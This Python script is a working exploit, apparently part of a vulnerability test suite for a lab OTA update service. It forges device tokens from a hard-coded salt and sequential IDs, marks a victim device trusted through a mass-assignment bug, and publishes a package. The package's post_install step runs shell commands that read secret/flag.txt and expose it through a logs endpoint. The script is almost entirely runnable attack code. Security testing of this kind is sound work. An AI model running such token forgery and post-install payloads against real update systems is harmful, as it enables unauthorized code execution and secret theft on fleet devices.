#!/usr/bin/env python3
"""
PoC #9: Predictable device IDs and auth tokens
----------------------------------------------------
Store.RegisterDevice() (store.go) hands out sequential IDs ("device-1",
"device-2", ...), and deviceToken() (auth.go) derives every token as
sha256(deviceTokenSalt + ":" + id)[:32] - a fixed, compiled-in salt with no
randomness at all. Anyone who can read this source (or just guess a small
sequential ID) can compute a valid token for a device they never registered and
never received credentials for.

Scoreable impact: guessable tokens are an alternate, auth-bypassing route into
the SAME fleet-member secret #7/#2/#4 reach, without ever holding a legitimate
credential. This PoC:

  1. A "victim" registers a device normally. The attacker learns only its ID
     (guessing the next sequential number, or observing traffic); the real token
     is captured here purely to prove the derived one matches, never used to
     authenticate.
  2. The attacker independently recomputes the victim's token from the public
     salt/ID formula alone.
  3. Using ONLY that derived token, the attacker marks the victim device
     trusted via /sync's mass-assignment bug (#7's primitive, someone else's
     identity).
  4. The attacker publishes using nothing but the victim's ID and the DERIVED
     token - no X-OTA-Api-Key, no legitimately-received token - and the fleet
     member applies it, exfiltrating log-module's real per-deployment secret
     (secret/flag.txt, from the minted LOG_FLAG_VALUE), read back through
     GET /logs/{name}.

So this isn't "spoof one status field" - it's guess an ID, derive its token,
and walk straight into fleet-member secret theft. It cashes out through #4's
post_install sink (while #7 uses #3's tar-slip sink), so the three
unauthenticated-publish routes (#2/#7/#9) are split across the two delivery
sinks and no single server-side sink fix in publish.go flips all three (see
vuln_tests/README.md).

Run against the docker-compose fleet:
  docker compose -f vuln_tests/docker-compose.yml run --build --rm poc \
      python3 09_predictable_device_token.py ota 8090
"""
import hashlib
import io
import json
import os
import re
import sys
import tarfile
import time
import urllib.error
import urllib.request
import uuid

OTA_HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
OTA_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8090
OTA_BASE = f"http://{OTA_HOST}:{OTA_PORT}"
LOG_HOST = os.environ.get("LOG_HOST", "log")
LOG_PORT = int(os.environ.get("LOG_PORT", "8080"))
LOG_BASE = f"http://{LOG_HOST}:{LOG_PORT}"
# Read straight out of auth.go - never supplied to us by the victim or server.
DEVICE_TOKEN_SALT = "ota-static-fleet-salt-v1"
EXPECTED_FLAG = os.environ.get("LOG_FLAG_VALUE", "")
FLAG_RE = re.compile(r"FLAG\{[^}]{1,256}\}")


def derive_token(device_id):
    return hashlib.sha256(f"{DEVICE_TOKEN_SALT}:{device_id}".encode()).hexdigest()[:32]


def post_json(path, body, headers=None):
    req = urllib.request.Request(f"{OTA_BASE}{path}", data=json.dumps(body).encode(), method="POST")
    req.add_header("Content-Type", "application/json")
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())


def make_targz(entries):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, content in entries:
            info = tarfile.TarInfo(name=name)
            info.size = len(content)
            tf.addfile(info, io.BytesIO(content))
    return buf.getvalue()


def multipart(fields, filename, file_bytes):
    boundary = "----otaPoC" + uuid.uuid4().hex
    body = b""
    for name, value in fields.items():
        body += (f"--{boundary}\r\nContent-Disposition: form-data; "
                  f'name="{name}"\r\n\r\n{value}\r\n').encode()
    body += (f"--{boundary}\r\nContent-Disposition: form-data; "
              f'name="package"; filename="{filename}"\r\n'
              "Content-Type: application/gzip\r\n\r\n").encode()
    body += file_bytes + b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    return boundary, body


def main():
    token = uuid.uuid4().hex[:12]
    proof_name = f"predtoken_{token}.txt"

    print("[*] Victim registers a device normally")
    status, victim = post_json("/devices/register", {"module": "log"})
    if status != 201:
        print(f"[-] Registration failed: {status} {victim}")
        return 1
    victim_id, real_token = victim["id"], victim["token"]
    print(f"[*] Victim device: {victim_id} (its real token is captured only to verify the "
          f"derivation below, and is never used to authenticate)")

    guessed_token = derive_token(victim_id)
    print(f"[*] Attacker independently derives a token from the known salt formula: {guessed_token}")
    if guessed_token != real_token:
        print("[-] Derived token does not match the real one - salt/formula assumption is stale")
        return 1
    print("[*] Derived token matches; from here on ONLY the derived token is used")

    print(f"[*] Attacker /devices/{victim_id}/sync with an undocumented 'trusted' field "
          f"(using ONLY the derived token - #7's primitive, someone else's identity)")
    status, synced = post_json(f"/devices/{victim_id}/sync", {"status": "ok", "trusted": True},
                                {"Authorization": f"Bearer {guessed_token}"})
    print(f"[*] /sync -> {status} {synced}")
    if status != 200 or not synced.get("trusted"):
        print("[-] /sync did not report trusted=true")
        return 1

    package = make_targz([("README.txt", b"routine log-module maintenance update\n")])
    sha = hashlib.sha256(package).hexdigest()
    version = f"1.0.0-predtoken-{token[:6]}"
    post_install = (
        f"id > logs/{proof_name}; "
        f"echo OTA_PREDTOKEN_{token} >> logs/{proof_name}; "
        f"cat secret/flag.txt >> logs/{proof_name}"
    )
    manifest = {"module": "log", "version": version, "sha256": sha, "post_install": post_install}

    boundary, body = multipart({"manifest": json.dumps(manifest)}, "pkg.tar.gz", package)
    req = urllib.request.Request(f"{OTA_BASE}/publish", data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    req.add_header("X-OTA-Device-Id", victim_id)
    req.add_header("X-OTA-Device-Token", guessed_token)
    print(f"[*] Publishing using ONLY the derived device credentials ({victim_id}) - "
          f"no X-OTA-Api-Key, no real victim token, ever presented")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            print(f"[*] /publish -> {r.status}")
    except urllib.error.HTTPError as e:
        print(f"[*] /publish -> {e.code} {e.read().decode(errors='replace')[:200]}")
        print("[-] Publish with derived device credentials was rejected (predictable tokens fixed).")
        return 1

    print("[*] Waiting for log-module's agent to poll, apply, and run post_install...")
    deadline = time.time() + 60
    got = None
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(f"{LOG_BASE}/logs/{proof_name}", timeout=5) as r:
                text = r.read().decode(errors="replace")
            if f"OTA_PREDTOKEN_{token}" in text:
                got = text
                break
        except (urllib.error.HTTPError, urllib.error.URLError, ConnectionError):
            pass
        time.sleep(3)

    if got is None:
        print("[-] Timed out waiting for the applied package's output via /logs/{name}")
        return 1

    m = FLAG_RE.search(got)
    if not m:
        print("[-] Package was applied, but no FLAG{...} was exfiltrated from secret/flag.txt")
        return 1
    flag = m.group(0)

    if EXPECTED_FLAG and flag != EXPECTED_FLAG:
        print(f"[-] Exfiltrated {flag!r} but expected {EXPECTED_FLAG!r} - value mismatch.")
        return 1
    print("[+] SCORED: a token derived from the public salt formula alone (no legitimate credential "
          "ever received) marked a stranger's device trusted and published through it; the fleet "
          f"member applied that package, exfiltrating the log host's minted secret {flag!r}.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
